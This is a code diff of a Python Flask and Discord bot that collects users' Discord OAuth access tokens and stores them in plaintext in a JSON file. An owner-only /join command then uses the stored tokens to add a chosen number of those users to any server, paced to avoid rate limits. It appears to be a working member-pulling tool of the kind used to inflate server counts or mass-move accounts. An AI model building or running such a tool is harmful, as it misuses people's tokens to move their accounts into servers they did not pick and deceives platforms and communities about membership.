@@ -3,6 +3,7 @@ import threading
 import asyncio
 import requests
 import aiohttp
+import json
 
 from flask import Flask, request, redirect
 import discord
@@ -18,12 +19,20 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 REDIRECT_URI = os.getenv("REDIRECT_URI")
 API = "https://discord.com/api"
 
-# ------------------ PERSISTENT STORAGE ------------------ #
-# Render persistent disk path
-PERSISTENT_PATH = "users.txt"
+OWNER_ID = 1458374465879543927
 
-# Ensure the folder exists
-os.makedirs(os.path.dirname(PERSISTENT_PATH), exist_ok=True)
+# ------------------ STORAGE ------------------ #
+USERS_FILE = "users.json"
+
+def load_users():
+    if not os.path.exists(USERS_FILE):
+        return {}
+    with open(USERS_FILE, "r") as f:
+        return json.load(f)
+
+def save_users(users):
+    with open(USERS_FILE, "w") as f:
+        json.dump(users, f)
 
 # ------------------ FLASK APP ------------------ #
 app = Flask(__name__)
@@ -41,6 +50,7 @@ def login():
 @app.route("/callback")
 def callback():
     code = request.args.get("code")
+
     if not code:
         return "No code provided."
 
@@ -54,7 +64,11 @@ def callback():
 
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
 
-    token = requests.post(f"{API}/oauth2/token", data=data, headers=headers).json()
+    token = requests.post(
+        f"{API}/oauth2/token",
+        data=data,
+        headers=headers
+    ).json()
 
     if "access_token" not in token:
         return f"OAuth Error: {token}"
@@ -68,23 +82,24 @@ def callback():
 
     user_id = user["id"]
 
-    # Append to persistent users.txt
-    with open(PERSISTENT_PATH, "a") as f:
-        f.write(f"{user_id}:{access_token}\n")
+    users = load_users()
+
+    # Prevent duplicates
+    if user_id not in users:
+        users[user_id] = access_token
+        save_users(users)
 
     return "Authorization successful!"
 
-# Optional route to view authorized users (for debug)
+# Debug route
 @app.route("/users")
 def show_users():
-    if os.path.exists(PERSISTENT_PATH):
-        with open(PERSISTENT_PATH, "r") as f:
-            return "<br>".join(f.read().splitlines())
-    return "No users yet."
+    users = load_users()
+    return "<br>".join(users.keys()) if users else "No users yet."
 
 # ------------------ RUN FLASK ------------------ #
 def run_flask():
-    port = int(os.environ.get("PORT", 10000))  # Render assigns PORT automatically
+    port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
 
 # ------------------ DISCORD BOT ------------------ #
@@ -105,53 +120,70 @@ client = MyClient()
 async def on_ready():
     print(f"Logged in as {client.user}")
 
+# ------------------ JOIN COMMAND ------------------ #
 @client.tree.command(
     name="join",
-    description="Join all authorized users to a specified server"
+    description="Join authorized users to a server"
 )
-@app_commands.describe(server_id="The ID of the server to join")
-async def join(interaction: discord.Interaction, server_id: str):
+@app_commands.describe(
+    server_id="Server ID to join",
+    amount="How many members to add"
+)
+async def join(interaction: discord.Interaction, server_id: str, amount: int):
+
+    # Owner protection
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message(
+            "You cannot use this command.",
+            ephemeral=True
+        )
+        return
+
     await interaction.response.defer()
+
+    users = load_users()
+
+    if not users:
+        await interaction.followup.send("No authorized users.")
+        return
+
     added = 0
 
-    try:
-        with open(PERSISTENT_PATH, "r") as f:
-            users = [line.strip() for line in f if line.strip()]
+    async with aiohttp.ClientSession() as session:
 
-        async with aiohttp.ClientSession() as session:
-            tasks = []
+        for user_id, access_token in list(users.items())[:amount]:
 
-            for line in users:
-                user_id, access_token = line.split(":")
-                url = f"{API}/guilds/{server_id}/members/{user_id}"
-                headers = {"Authorization": f"Bot {BOT_TOKEN}"}
-                json_data = {"access_token": access_token}
+            url = f"{API}/guilds/{server_id}/members/{user_id}"
 
-                tasks.append(session.put(url, json=json_data, headers=headers))
+            headers = {
+                "Authorization": f"Bot {BOT_TOKEN}"
+            }
 
-            responses = await asyncio.gather(*tasks, return_exceptions=True)
+            json_data = {
+                "access_token": access_token
+            }
 
-            for resp in responses:
-                if isinstance(resp, Exception):
-                    print(resp)
-                elif resp.status in (200, 201):
-                    added += 1
-                else:
-                    print(await resp.text())
+            try:
+                async with session.put(url, json=json_data, headers=headers) as resp:
 
-        await interaction.followup.send(
-            f"Attempted to add {added} users to server {server_id}"
-        )
+                    if resp.status in (200, 201):
+                        added += 1
 
-    except FileNotFoundError:
-        await interaction.followup.send("No authorized users found.")
+            except Exception as e:
+                print(e)
+
+            # Rate limit protection
+            await asyncio.sleep(0.7)
+
+    await interaction.followup.send(
+        f"Added **{added} members** to server `{server_id}`"
+    )
 
 # ------------------ START SERVICES ------------------ #
 if __name__ == "__main__":
-    # Run Flask in a separate thread
+
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.daemon = True
     flask_thread.start()
 
-    # Run Discord bot
     client.run(BOT_TOKEN)
